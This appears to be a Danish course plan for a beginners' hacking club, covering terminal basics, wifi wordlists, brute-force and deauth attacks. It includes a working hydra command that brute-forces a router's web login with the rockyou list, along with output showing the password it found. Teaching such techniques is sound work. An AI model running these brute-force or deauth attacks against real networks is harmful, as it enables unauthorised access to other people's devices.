# pirathak

Uge 36/ 6.september: introduktion terminal, filer, directories
 - Piraterne skal kunne forstå filstruktur i homedirectory
 - Skal kunne bevæge sig i filstrukturen, komme hjem, lave filer, directories
 - Vise filer med cat, bruge less/ more

Uge 37/ 13.september: wordlists og brute force angreb
 - Grundlæggende forståelse af wifi teknologi
 - Forståelse af at generere ordlister med crunch
 - Kunne scanne efter wifi netværk
 - Kunne lave et brute force angreb

Brute force eksempel på at hacke et router interface (en http form) - det kan vi ikke gøre med wifi?!
```
hydra -l root -P ./rockyou.txt -t 9 -V -I 192.168.1.1 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-21 23:21:36
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 9 tasks per 1 server, overall 9 tasks, 14344399 login tries (l:1/p:14344399), ~1593823 tries per task
[DATA] attacking http-post-form://192.168.1.1:80/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username
[ATTEMPT] target 192.168.1.1 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "abc123" - 10 of 14344399 [child 0] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "nicole" - 11 of 14344399 [child 1] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "daniel" - 12 of 14344399 [child 2] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "babygirl" - 13 of 14344399 [child 3] (0/0)
[ATTEMPT] target 192.168.1.1 - login "root" - pass "monkey" - 14 of 14344399 [child 4] (0/0)
[80][http-post-form] host: 192.168.1.1   login: root   password: princess
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-21 23:22:21
```

Uge 38/ 20.september: deauth angreb og generering af wordlists
 - Brug af f.eks. cewl (web scraping), cupp (profilering)
 - Brug af wifite
